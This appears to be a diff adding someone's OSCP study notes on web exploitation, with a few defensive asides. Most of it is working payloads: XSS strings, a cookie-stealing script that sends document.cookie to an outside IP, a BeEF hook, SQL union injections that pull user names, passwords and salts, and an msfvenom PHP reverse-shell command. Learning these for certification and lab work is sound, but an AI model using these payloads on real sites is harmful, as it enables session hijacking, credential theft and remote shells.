@@ -1,0 +1,58 @@
+OSCP commands part 6 - Web exploitation
+
+When spidering if it's not linked in the site, it will not show!
+So Spidering with Burp, if there's no link in the website, Burp will not discover.
+
+<script>alert(1)</script>
+
+When you are doing an XSS, it gets recorded in the HTML code. This means it gets recorded in the
+code!
+
+http://lcex/contact.php?id=1" /> <script>alert(1)</script>
+
+- adding a ; after (1) it depends on the code. Always check the code.
+
+Look up Polygots! It will help you speed up for XSS testing.
+
+<script>var link = document.createElement('a');link.href='http://the.earth.il/~sgtatham/putty/latest/x86/putty.exe';link.download=";document.body.appendChild(link);link.click();</script>
+
+<body onload="alert('Xss')">
+
+cure53 xss challenge - toughest CTF
+
+" /><script>document.write('<img src="http://10.100.100.105/Stealer.php?cookie=' %2Bdocument.cookie %2B '" />');</script> - victim
+
+
+
+Beef-XS:
+1" /><script src="http://<Your IP>:3000/hook.js"></script>
+
+
+<script>alert(1);</script>
+
+When changing your password under your account, the site, should be checking for the old password, upon changing your password to a new one.
+
+Build your own vulnerable site, that is susceptible to all OWASP10 vulns.
+Learn how to build it vulnerable!
+
+vaultproject.io - to not use the username and password inside of the global.php
+
+<script src="/cache.php?src=./static/js/jquery-3.1.1.min.js"></script>
+
+#################################
+
+http://lcex/news.php?id='' union select 1,2,3,4,5,6
+
+http://lcex/news.php?id='' union select 1,schema_name,3,4,5,6 from information_schema.schemata limit 1,1
+
+http://lcex/news.php?id='' union select 1,concat(user_name,':',user_password,':',user_salt),3,4,5,6 from users;
+
+We can see that the vulnerable injectable fields are 2, 6, 5, 4 as they are reflected back on the page
+
+
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.100.100.59 LPORT=443 -e php/base64 -f raw > msf.php
+
+http://flaws.cloud - if you want to learn about pentesting the cloud!!!
+
+ctftime.org
